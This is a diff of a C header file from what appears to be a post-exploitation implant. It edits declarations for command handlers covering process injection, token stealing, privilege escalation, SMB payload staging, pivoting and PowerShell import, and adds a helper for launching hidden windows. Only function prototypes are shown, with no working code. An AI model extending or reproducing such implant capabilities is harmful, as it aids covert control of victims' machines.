@@ -65,25 +65,24 @@ void command_inject_ping(char * buffer, int length, BOOL x86, void (*cb)(char * 
 void command_inject_pid(char * buffer, int length, BOOL x86);
 void command_spawnas(char * buffer, int length, BOOL x86);
 void command_spawnu(char * buffer, int length, BOOL x86);
-void command_dll_load(char * buffer, int length);
 void command_cd(char * buffer, int length);
 void command_execjob(char * buffer, int length);
 void command_upload(char * buffer, int length, char * mode);
+/* shared hidden-window STARTUPINFO skeleton */
+void startupinfo_hidden(STARTUPINFO * si, HANDLE out);
+
 void command_execute(char * buffer, int length);
 void command_spawnproc(char * buffer, int length, BOOL x86);
 void command_runas(char * buffer, int length, void (*callback)(char * buffer, int length, int type));
 void command_runu(char * buffer, int length);
 void command_pwd(void(*callback)(char * buffer, int length, int type));
 void command_pause(char * buffer, int length);
-void command_ipconfig(char * buffer, int length, void(*callback)(char * buffer, int length, int type));
 void command_loginuser(char * buffer, int length, void(*callback)(char * buffer, int length, int type));
 void command_stage_payload(char * buffer, int length);
 void command_stage_payload_smb(char * buffer, int length);
 void command_setenv(char * buffer, int length);
 void command_ppid(char * buffer, int length);
 void command_inject_pid_ping(char * buffer, int length, void(*callback)(char * buffer, int length, int type), BOOL x86);
-void command_reg_query(char * buffer, int length, void(*callback)(char * buffer, int length, int type));
-void command_elevate_run_inject(BOOL x86, char * buffer, int length);
 
 /* job API */
 void command_job_register(char * buffer, int length, BOOL impersonate, short mode);
@@ -116,7 +115,6 @@ void command_steal_token(char * buffer, int length, void (*callback)(char * buff
 void command_token_store(char * buffer, int length, void (*callback)(char * buffer, int length, int type));
 
 /* privilege escalation commands */
-void command_getsystem(char * buffer, int length);
 void command_elevate_pre(char * buffer, int length);
 void command_elevate_post(void(*callback)(char * buffer, int length, int type));
 void command_getprivs(char * buffer, int length, void(*callback)(char * buffer, int length, int type));
@@ -134,7 +132,6 @@ void command_socket_tcppivot(char * buffer, int length);
 
 void pivot_poll(void (*cb)(char * buffer, int length, int type));
 void download_poll(void (*cb)(char * buffer, int length, int type), int max);
-void token_report(void (*cb)(char * buffer, int length, int type));
 void psh_poll(void (*callback)(char * buffer, int length, int type), int max);
 
 /* linking and message routing stuff */
@@ -164,8 +161,6 @@ void command_argue_remove(char * buffer, int length);
 void command_argue_list(void(*callback)(char * buffer, int length, int type));
 
 /* kerberos related commands */
-void command_kerberos_ticket_purge();
-void command_kerberos_ticket_use(char * buffer, int length);
 
 /* powershell related commands */
 void command_psh_import(char * buffer, int length);
